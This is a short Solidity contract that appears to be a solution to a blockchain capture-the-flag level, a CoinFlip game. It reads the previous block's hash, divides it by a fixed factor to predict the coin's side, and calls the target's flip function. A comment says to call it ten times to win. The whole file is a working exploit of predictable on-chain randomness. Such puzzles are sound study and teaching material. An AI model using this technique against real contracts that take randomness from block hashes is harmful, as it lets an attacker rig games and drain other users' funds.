// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Level3 {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //simply call this method 10 times to win the coinflip 10 times in a row 
    function guess(CoinFlip coinFlip ) external {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 side = blockValue/FACTOR;
        bool sideBool = side == 1 ? true : false;
        coinFlip.flip(sideBool);
    }
}